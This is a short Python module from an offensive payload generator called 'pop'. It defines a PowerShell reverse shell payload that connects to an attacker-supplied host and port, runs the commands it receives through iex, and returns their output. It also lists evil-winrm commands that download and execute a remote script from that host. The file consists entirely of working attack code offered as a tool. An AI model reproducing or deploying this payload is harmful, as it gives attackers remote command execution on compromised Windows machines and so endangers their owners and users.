#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
# TODO ip -> integer

USAGE = 'host port'
NARGS = [2, 2]
LANG = 'ps'
EXEC = """
evil-winrm> iex(iwr -useb ARG1/pl.ps1)
evil-winrm> iex((new-object net.webclient).downloadstring('http://ARG1/pl.ps1'))
evil-winrm> PAYLOAD
"""


pl = '''
$VAR1=(New-Object Net.Sockets.TCPClient("ARG1",ARG2)).GetStream();[byte[]]$VAR2=0..255|%{0};while(($VAR3=$VAR1.Read($VAR2,0,$VAR2.Length))-ne0){$VAR4=(New-Object -TypeName Text.ASCIIEncoding).GetString($VAR2,0,$VAR3);$VAR6=([text.encoding]::ASCII).GetBytes($((iex($VAR4))2>&1|Out-String));$VAR1.Write($VAR6,0,$VAR6.Length);$VAR1.Flush()}
'''
